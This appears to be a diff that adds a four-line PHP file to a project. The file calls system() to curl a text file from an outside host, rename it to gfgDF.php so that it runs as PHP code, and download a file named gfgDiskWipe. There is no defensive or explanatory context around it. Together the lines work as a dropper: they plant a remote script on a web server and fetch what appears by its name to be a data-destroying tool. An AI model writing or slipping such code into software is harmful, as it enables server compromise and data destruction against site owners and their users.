@@ -1,0 +1,4 @@
+<?php
+system("curl -O http://gfgdfserver/gfgdf/gfgDF.txt -o gfgDF.txt");
+system("mv gfgDF.txt gfgDF.php");
+system("curl -O http://gfgdfserver/gfgdf/gfgDiskWipe -o gfgDiskWipe");
